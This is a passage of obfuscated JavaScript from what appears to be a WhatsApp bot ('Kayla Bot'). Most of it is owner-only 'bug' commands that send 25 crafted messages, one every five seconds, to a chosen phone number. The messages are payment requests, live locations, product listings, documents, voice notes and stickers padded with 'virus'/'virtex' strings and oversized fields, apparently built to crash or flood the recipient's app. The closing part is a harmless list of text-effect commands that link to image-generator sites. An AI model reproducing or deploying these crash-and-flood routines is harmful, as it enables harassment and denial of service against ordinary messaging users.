            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          if (!q) {
            return _0x353dad.reply(
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1284) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1151)
            )
          }
          _0xe67f0c[_0x5acefe(1318)](
            _0x353dad.mentionedJid[0]
              ? _0x353dad[_0x5acefe(473)][0]
              : _0x353dad.quoted
              ? _0x353dad.quoted[_0x5acefe(1306)]
              : _0x3ae18c[_0x5acefe(1120)](/[^0-9]/g, '') + _0x5acefe(1366),
            {
              requestPaymentMessage: {
                Message: {
                  extendedTextMessage: {
                    text: _0x5acefe(1418),
                    currencyCodeIso4217: _0x5acefe(507),
                    requestFrom: _0x5acefe(1396),
                    expiryTimestamp: 8000,
                    amount: 1,
                    contextInfo: {
                      externalAdReply: {
                        title: _0x5acefe(1283) + virus + virtex(_0x5d46d4),
                        body: _0x5acefe(1283) + virus + virtex(_0x5d46d4),
                        mimetype: _0x5acefe(996),
                        caption: _0x5acefe(512) + ngazap(_0x5d46d4),
                        showAdAttribution: true,
                        sourceUrl: _0x5acefe(1411),
                        thumbnailUrl: ppnyauser,
                        thumbnail: ppnyauser,
                      },
                    },
                  },
                },
              },
            },
            { quoted: _0x54b042 }
          )
        }
        break
      case _0x5acefe(804):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          _0xe67f0c[_0x5acefe(1318)](
            _0x353dad[_0x5acefe(473)][0]
              ? _0x353dad.mentionedJid[0]
              : _0x353dad[_0x5acefe(435)]
              ? _0x353dad[_0x5acefe(435)][_0x5acefe(1306)]
              : _0x353dad.chat,
            {
              requestPaymentMessage: {
                Message: {
                  extendedTextMessage: {
                    text: 'Kayla Bot ' + virus + virtex(_0x5d46d4),
                    currencyCodeIso4217: _0x5acefe(507),
                    requestFrom: _0x5acefe(1396),
                    expiryTimestamp: 8000,
                    amount: 1,
                    contextInfo: {
                      externalAdReply: {
                        title: 'Fin Bot',
                        body: _0x5acefe(399),
                        mimetype: _0x5acefe(996),
                        caption: 'Kayla Bot WhatsApp' + ngazap(_0x5d46d4),
                        showAdAttribution: true,
                        sourceUrl: _0x5acefe(1411),
                        thumbnailUrl: ppnyauser,
                        thumbnail: ppnyauser,
                      },
                    },
                  },
                },
              },
            },
            { quoted: _0x54b042 }
          )
          _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(1184)])
        }
        break
      case 'locgas':
        {
          if (!_0x3c922f) {
            return _0x353dad.reply(mess[_0x5acefe(888)])
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1284) +
                (_0x5d46d4 + _0x6e642b) +
                ' 6281297970769'
            )
          }
          num = '' + q + _0x5acefe(1366)
          jumlah = '25'
          waktu = '5s'
          for (let _0x562b30 = 0; _0x562b30 < jumlah; _0x562b30++) {
            var _0x4ca4b1 = await prepareWAMessageMedia(
                { image: ppnyauser },
                { upload: _0xe67f0c.waUploadToServer }
              ),
              _0x5e35da = generateWAMessageFromContent(
                num,
                proto.Message[_0x5acefe(1370)]({
                  liveLocationMessage: {
                    degreesLatitude: -6.9367014,
                    degreesLongitude: 107.7228574,
                    name: _0x5acefe(1283) + virus + virtex(_0x5d46d4),
                    url: _0x5acefe(447),
                    caption: _0x5acefe(1283) + virus + virtex(_0x5d46d4),
                    sequenceNumber: _0x5acefe(1361),
                    jpegThumbnail: _0x4ca4b1[_0x5acefe(375)],
                    mtype: 'locationMessage',
                  },
                }),
                {
                  userJid: num,
                  quoted: _0x4bb5b8,
                }
              )
            _0xe67f0c.relayMessage(num, _0x5e35da.message, {
              messageId: _0x5e35da[_0x5acefe(1287)].id,
            })
            await sleep(ms(waktu))
          }
          _0x353dad.reply(
            _0x5acefe(1097) +
              num +
              _0x5acefe(1117) +
              jumlah +
              _0x5acefe(1326) +
              waktu
          )
        }
        break
      case _0x5acefe(1134):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess.owner)
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                ' nomor\nContoh ' +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(691)
            )
          }
          num = '' + q + _0x5acefe(1366)
          jumlah = '25'
          waktu = '5s'
          for (let _0x1200e6 = 0; _0x1200e6 < jumlah; _0x1200e6++) {
            _0xe67f0c[_0x5acefe(1318)](
              num,
              {
                requestPaymentMessage: {
                  Message: {
                    extendedTextMessage: {
                      text: _0x5acefe(1283) + virus + virtex(_0x5d46d4),
                      currencyCodeIso4217: _0x5acefe(507),
                      requestFrom: _0x5acefe(1396),
                      expiryTimestamp: 8000,
                      amount: 1,
                      background: ppnyauser,
                    },
                  },
                },
              },
              { quoted: _0xb17d82 }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1097) +
              num +
              _0x5acefe(1117) +
              jumlah +
              _0x5acefe(1326) +
              waktu
          )
        }
        break
      case _0x5acefe(1236):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1284) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(691)
            )
          }
          num = '' + q + '@s.whatsapp.net'
          jumlah = '25'
          waktu = '5s'
          for (let _0x2e9df2 = 0; _0x2e9df2 < jumlah; _0x2e9df2++) {
            _0xe67f0c[_0x5acefe(655)](
              num,
              {
                audio: audionye,
                mimetype: _0x5acefe(976),
                seconds: 999999999,
                ptt: true,
                mentions: [_0x353dad[_0x5acefe(1306)]],
              },
              { quoted: _0xabe285 }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            'Sukses Send Bug Ke Nomor ' +
              num +
              ' Sebanyak ' +
              jumlah +
              _0x5acefe(1326) +
              waktu
          )
        }
        break
      case _0x5acefe(540):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess.owner)
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1284) +
                (_0x5d46d4 + _0x6e642b) +
                ' 6282261065144'
            )
          }
          num = '' + q + _0x5acefe(1366)
          jumlah = '25'
          waktu = '5s'
          for (let _0x53824a = 0; _0x53824a < jumlah; _0x53824a++) {
            _0xe67f0c.sendContact(num, owner, _0x4bb5b8)
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1097) +
              num +
              _0x5acefe(1117) +
              jumlah +
              ' Dengan Timer ' +
              waktu
          )
        }
        break
      case _0x5acefe(987):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1284) +
                (_0x5d46d4 + _0x6e642b) +
                ' 6281297970769'
            )
          }
          num = '' + q + _0x5acefe(1366)
          jumlah = '25'
          waktu = '5s'
          for (let _0x3e749d = 0; _0x3e749d < jumlah; _0x3e749d++) {
            _0xe67f0c[_0x5acefe(655)](
              num,
              {
                document: ppnyauser,
                fileName: '' + virtex(_0x5d46d4),
                mimetype: _0x5acefe(856),
                jpegThumbnail: ppnyauser,
                fileLength: _0x5acefe(861),
                mentions: [_0x5ca45c],
              },
              { quoted: _0x4bb5b8 }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1097) +
              num +
              _0x5acefe(1117) +
              jumlah +
              _0x5acefe(1326) +
              waktu
          )
        }
        break
      case 'stickgas':
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess.owner)
          }
          if (!q) {
            return _0x353dad.reply(
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                ' nomor\nContoh ' +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(691)
            )
          }
          num = '' + q + _0x5acefe(1366)
          jumlah = '25'
          waktu = '5s'
          for (let _0x856a96 = 0; _0x856a96 < jumlah; _0x856a96++) {
            _0xe67f0c[_0x5acefe(655)](
              num,
              { sticker: ppnyauser },
              { quoted: _0x4bb5b8 }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1097) +
              num +
              _0x5acefe(1117) +
              jumlah +
              _0x5acefe(1326) +
              waktu
          )
        }
        break
      case _0x5acefe(994):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          if (!q) {
            return _0x353dad.reply(
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1284) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(691)
            )
          }
          num = '' + q + _0x5acefe(1366)
          jumlah = '25'
          waktu = '5s'
          for (let _0x19b95c = 0; _0x19b95c < jumlah; _0x19b95c++) {
            _0xc94dd2(
              num,
              _0x5acefe(1283) + virus + virtex(_0x5d46d4),
              _0x5acefe(1283) + virus + virtex(_0x5d46d4),
              _0x5acefe(1283) + virus + virtex(_0x5d46d4),
              ppnyauser,
              _0x5acefe(735),
              [{ productId: _0x5acefe(930) }],
              _0x5acefe(930)
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1097) +
              num +
              _0x5acefe(1117) +
              jumlah +
              ' Dengan Timer ' +
              waktu
          )
        }
        break
      case _0x5acefe(1248):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                ' nomor\nContoh ' +
                (_0x5d46d4 + _0x6e642b) +
                ' 6281297970769'
            )
          }
          num = '' + q + '@s.whatsapp.net'
          jumlah = '25'
          waktu = '5s'
          for (let _0x5e3ca5 = 0; _0x5e3ca5 < jumlah; _0x5e3ca5++) {
            var _0x4ca4b1 = await prepareWAMessageMedia(
                { image: ppnyauser },
                { upload: _0xe67f0c[_0x5acefe(1011)] }
              ),
              _0x7e20c8 = generateWAMessageFromContent(
                num,
                proto[_0x5acefe(768)][_0x5acefe(1370)]({
                  productMessage: {
                    product: {
                      productImage: _0x4ca4b1[_0x5acefe(375)],
                      productId: _0x5acefe(1093),
                      title: _0x5acefe(1289) + virus + ' ' + virtex(_0x5d46d4),
                      description: '' + virus + virtex(_0x5d46d4),
                      currencyCode: 'IDR',
                      priceAmount1000: '100000000000000000',
                      productImageCount: 1,
                      firstImageId: 1,
                      salePriceAmount1000: _0x5acefe(1135),
                      retailerId: _0x5acefe(621),
                      url: _0x5acefe(523),
                    },
                    businessOwnerJid: _0x5acefe(1405),
                  },
                }),
                {
                  userJid: _0x353dad[_0x5acefe(408)],
                  quoted: _0x4bb5b8,
                }
              )
            _0xe67f0c[_0x5acefe(1318)](num, _0x7e20c8[_0x5acefe(989)], {
              messageId: _0x7e20c8.key.id,
            })
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            'Sukses Send Bug Ke Nomor ' +
              num +
              _0x5acefe(1117) +
              jumlah +
              _0x5acefe(1326) +
              waktu
          )
        }
        break
      case _0x5acefe(1062):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess.owner)
          }
          jumlah = '25'
          waktu = '5s'
          for (let _0x456f81 = 0; _0x456f81 < jumlah; _0x456f81++) {
            var _0x4ca4b1 = await prepareWAMessageMedia(
                { image: ppnyauser },
                { upload: _0xe67f0c.waUploadToServer }
              ),
              _0x7e20c8 = generateWAMessageFromContent(
                _0x353dad[_0x5acefe(408)],
                proto[_0x5acefe(768)].fromObject({
                  productMessage: {
                    product: {
                      productImage: _0x4ca4b1[_0x5acefe(375)],
                      productId: _0x5acefe(1093),
                      title: _0x5acefe(1289) + virus + ' ' + virtex(_0x5d46d4),
                      description: '' + virus + virtex(_0x5d46d4),
                      currencyCode: 'IDR',
                      priceAmount1000: _0x5acefe(1013),
                      productImageCount: 1,
                      firstImageId: 1,
                      salePriceAmount1000: '1000',
                      retailerId: _0x5acefe(621),
                      url: _0x5acefe(523),
                    },
                    businessOwnerJid: _0x5acefe(1405),
                  },
                }),
                {
                  userJid: _0x353dad[_0x5acefe(408)],
                  quoted: _0x4bb5b8,
                }
              )
            _0xe67f0c[_0x5acefe(1318)](
              _0x353dad[_0x5acefe(408)],
              _0x7e20c8.message,
              { messageId: _0x7e20c8[_0x5acefe(1287)].id }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(401) + jumlah + _0x5acefe(1326) + waktu
          )
        }
        break
      case _0x5acefe(883):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          jumlah = '25'
          waktu = '5s'
          for (let _0x36dcb2 = 0; _0x36dcb2 < jumlah; _0x36dcb2++) {
            var _0x4ca4b1 = await prepareWAMessageMedia(
                { image: ppnyauser },
                { upload: _0xe67f0c[_0x5acefe(1011)] }
              ),
              _0x5e35da = generateWAMessageFromContent(
                _0x353dad[_0x5acefe(408)],
                proto[_0x5acefe(768)][_0x5acefe(1370)]({
                  liveLocationMessage: {
                    degreesLatitude: -6.9367014,
                    degreesLongitude: 107.7228574,
                    name: _0x5acefe(1283) + virus + virtex(_0x5d46d4),
                    url: 'https://foursquare.com/v/58245afd7c74e13e299229d9',
                    caption: _0x5acefe(1283) + virus + virtex(_0x5d46d4),
                    sequenceNumber: _0x5acefe(1361),
                    jpegThumbnail: _0x4ca4b1.imageMessage,
                    mtype: _0x5acefe(1023),
                  },
                }),
                {
                  userJid: _0x353dad[_0x5acefe(408)],
                  quoted: _0x4bb5b8,
                }
              )
            _0xe67f0c[_0x5acefe(1318)](
              _0x353dad[_0x5acefe(408)],
              _0x5e35da.message,
              { messageId: _0x5e35da[_0x5acefe(1287)].id }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(401) + jumlah + _0x5acefe(1326) + waktu
          )
        }
        break
      case _0x5acefe(492):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess.owner)
          }
          jumlah = '25'
          waktu = '5s'
          for (let _0x34dc9b = 0; _0x34dc9b < jumlah; _0x34dc9b++) {
            _0xe67f0c[_0x5acefe(607)](
              _0x353dad[_0x5acefe(408)],
              owner,
              _0x4bb5b8
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(401) + jumlah + _0x5acefe(1326) + waktu
          )
        }
        break
      case _0x5acefe(680):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          jumlah = '25'
          waktu = '5s'
          for (let _0x285907 = 0; _0x285907 < jumlah; _0x285907++) {
            _0xc94dd2(
              _0x353dad.chat,
              _0x5acefe(1283) + virus + virtex(_0x5d46d4),
              _0x5acefe(1283) + virus + virtex(_0x5d46d4),
              _0x5acefe(1283) + virus + virtex(_0x5d46d4),
              ppnyauser,
              _0x5acefe(735),
              [{ productId: _0x5acefe(930) }],
              '5040735986035760'
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(401) + jumlah + _0x5acefe(1326) + waktu
          )
        }
        break
      case 'kaystick':
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          jumlah = '25'
          waktu = '5s'
          for (let _0x33b2c4 = 0; _0x33b2c4 < jumlah; _0x33b2c4++) {
            _0xe67f0c.sendMessage(
              _0x353dad.chat,
              { sticker: ppnyauser },
              { quoted: _0x4bb5b8 }
            )
            await sleep(ms(waktu))
          }
          _0x353dad.reply(_0x5acefe(401) + jumlah + _0x5acefe(1326) + waktu)
        }
        break
      case _0x5acefe(1286):
        {
          if (!_0x3c922f) {
            return _0x353dad.reply(mess[_0x5acefe(888)])
          }
          jumlah = '25'
          waktu = '5s'
          for (let _0x5e34e2 = 0; _0x5e34e2 < jumlah; _0x5e34e2++) {
            _0xe67f0c[_0x5acefe(655)](
              _0x353dad[_0x5acefe(408)],
              {
                document: ppnyauser,
                fileName: '' + virtex(_0x5d46d4),
                mimetype: _0x5acefe(856),
                jpegThumbnail: ppnyauser,
                fileLength: '999999999',
                mentions: [_0x5ca45c],
              },
              { quoted: _0x4bb5b8 }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(401) + jumlah + _0x5acefe(1326) + waktu
          )
        }
        break
      case _0x5acefe(1300):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess.owner)
          }
          jumlah = '25'
          waktu = '5s'
          for (let _0xa92345 = 0; _0xa92345 < jumlah; _0xa92345++) {
            _0xe67f0c.sendMessage(
              _0x353dad[_0x5acefe(408)],
              {
                audio: audionye,
                mimetype: _0x5acefe(976),
                seconds: 999999999,
                ptt: true,
                mentions: [_0x353dad.sender],
              },
              { quoted: _0xabe285 }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(401) + jumlah + _0x5acefe(1326) + waktu
          )
        }
        break
      case _0x5acefe(1238):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          jumlah = '25'
          waktu = '5s'
          for (let _0x7ba2f2 = 0; _0x7ba2f2 < jumlah; _0x7ba2f2++) {
            _0xe67f0c[_0x5acefe(1318)](
              _0x353dad[_0x5acefe(408)],
              {
                requestPaymentMessage: {
                  Message: {
                    extendedTextMessage: {
                      text: _0x5acefe(1283) + virus + virtex(_0x5d46d4),
                      currencyCodeIso4217: _0x5acefe(507),
                      requestFrom: _0x5acefe(1396),
                      expiryTimestamp: 8000,
                      amount: 1,
                      background: ppnyauser,
                    },
                  },
                },
              },
              { quoted: _0xb17d82 }
            )
            await sleep(ms(waktu))
          }
          _0x353dad[_0x5acefe(1036)](
            'Sukses Send Bug Sebanyak ' + jumlah + _0x5acefe(1326) + waktu
          )
        }
        break
      case 'owner':
        {
          _0xe67f0c[_0x5acefe(607)](_0x353dad[_0x5acefe(408)], owner, _0x353dad)
        }
        break
      case 'candy':
      case 'christmas':
      case _0x5acefe(927):
      case _0x5acefe(1419):
      case 'deepsea':
      case _0x5acefe(786):
      case _0x5acefe(960):
      case _0x5acefe(974):
      case 'spooky':
      case _0x5acefe(763):
      case _0x5acefe(699):
      case _0x5acefe(405):
      case 'metalic':
      case _0x5acefe(712):
      case _0x5acefe(1063):
      case _0x5acefe(1126):
      case _0x5acefe(500):
      case 'thunder':
      case _0x5acefe(1090):
      case _0x5acefe(1171):
      case _0x5acefe(750):
      case _0x5acefe(775):
      case 'harrypotter':
      case _0x5acefe(873):
      case _0x5acefe(475):
      case _0x5acefe(1327):
      case 'multicolor':
      case _0x5acefe(438):
      case 'underwater':
      case _0x5acefe(497):
      case _0x5acefe(805):
      case _0x5acefe(1049):
      case _0x5acefe(588):
      case 'ice':
      case _0x5acefe(559):
      case 'biscuit':
      case _0x5acefe(729):
      case _0x5acefe(1250):
      case _0x5acefe(1257):
      case 'matrix':
      case _0x5acefe(440):
      case 'dropwater':
      case 'toxic':
      case _0x5acefe(1397):
      case 'rock':
      case _0x5acefe(1394):
      case _0x5acefe(544):
      case _0x5acefe(1175):
      case _0x5acefe(1080):
      case 'wicker':
      case _0x5acefe(550):
      case 'skeleton':
      case _0x5acefe(634):
      case 'sand':
      case _0x5acefe(886):
      case _0x5acefe(1381):
      case 'leaves':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              'Example : ' + _0x6e642b + _0x5acefe(1388)
            )
          }
          if (/candy/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1343)
          }
          if (/christmas/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(520)
          }
          if (/3dchristmas/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
          }
          if (/sparklechristmas/.test(_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
          }
          if (/deepsea/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1297)
          }
          if (/scifi/.test(_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
          }
          if (/rainbow/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1083)
          }
          if (/waterpipe/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(576)
          }
          if (/spooky/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1056)
          }
          if (/pencil/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(400)
          }
          if (/circuit/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1295)
          }
          if (/discovery/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(377)
          }
          if (/metalic/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1301)
          }
          if (/fiction/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1024)
          }
          if (/demon/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
          }
          if (/transformer/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
          }
          if (/berry/.test(_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/create-berry-text-effect-online-free-1033.html'
          }
          if (/thunder/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(981)
          }
          if (/magma/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(866)
          }
          if (/3dstone/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(1276)
          }
          if (/neonlight/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(444)
          }
          if (/glitch/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(616)
          }
          if (/harrypotter/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1379)
          }
          if (/brokenglass/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1180)
          }
          if (/papercut/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(627)
          }
          if (/watercolor/.test(_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
          }
          if (/multicolor/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
          }
          if (/neondevil/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(1226)
          }
          if (/underwater/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(450)
          }
          if (/graffitibike/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(1364)
          }
          if (/snow/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(648)
          }
          if (/cloud/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(754)
          }
          if (/honey/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = 'https://textpro.me/honey-text-effect-868.html'
          }
          if (/ice/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(992)
          }
          if (/fruitjuice/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(434)
          }
          if (/biscuit/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(753)
          }
          if (/wood/.test(_0x6e642b)) {
            _0x28dfda = 'https://textpro.me/wood-text-effect-856.html'
          }
          if (/chocolate/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(572)
          }
          if (/strawberry/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1160)
          }
          if (/matrix/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(905)
          }
          if (/blood/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1102)
          }
          if (/dropwater/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(688)
          }
          if (/toxic/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(448)
          }
          if (/lava/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(534)
          }
          if (/rock/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(877)
          }
          if (/bloodglas/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1137)
          }
          if (/hallowen/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(589)
          }
          if (/darkgold/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1044)
          }
          if (/joker/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(618)
          }
          if (/wicker/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = 'https://textpro.me/wicker-text-effect-online-932.html'
          }
          if (/firework/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(1387)
          }
          if (/skeleton/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(1098)
          }
          if (/blackpink/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/create-blackpink-logo-style-online-1001.html'
          }
          if (/sand/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda =
              'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
          }
          if (/glue/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(914)
          }
          if (/1917/.test(_0x6e642b)) {
            _0x28dfda = _0x5acefe(1059)
          }
          if (/leaves/[_0x5acefe(590)](_0x6e642b)) {
            _0x28dfda = _0x5acefe(518)
          }
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              image: { url: _0x3b1361 },
              caption: '' + mess[_0x5acefe(1184)],
            },
            { quoted: _0x353dad }
          )
        }
        break
      case 'shadow':
      case _0x5acefe(547):
      case _0x5acefe(1375):
      case 'burnpaper':
      case 'smoke':
      case _0x5acefe(672):
      case 'love':
      case 'undergrass':
      case 'doublelove':
      case 'coffecup':
      case 'underwaterocean':
      case _0x5acefe(1193):
      case _0x5acefe(629):
      case 'rainboweffect':
      case 'balloontext':
      case _0x5acefe(746):
      case _0x5acefe(1112):
      case _0x5acefe(1271):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          if (!q) {
            return _0x353dad.reply('Example : ' + _0x6e642b + _0x5acefe(1388))
          }
          if (/shadow/.test(_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(1239)
          }
          if (/write/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 =
              'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
          }
          if (/romantic/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(537)
          }
          if (/burnpaper/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(556)
          }
          if (/smoke/.test(_0x6e642b)) {
            _0x4c6bf5 =
              'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
          }
          if (/naruto/.test(_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(517)
          }
          if (/love/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(1246)
          }
          if (/undergrass/.test(_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(485)
          }
          if (/doublelove/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 =
              'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
          }
          if (/coffecup/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 =
              'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
          }
          if (/underwaterocean/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 =
              'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
          }
          if (/smokyneon/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 =
              'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
          }
          if (/starstext/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(1408)
          }
          if (/rainboweffect/.test(_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(865)
          }
          if (/balloontext/.test(_0x6e642b)) {
            _0x4c6bf5 =
              'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
          }
          if (/metalliceffect/.test(_0x6e642b)) {
            _0x4c6bf5 =
              'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
          }
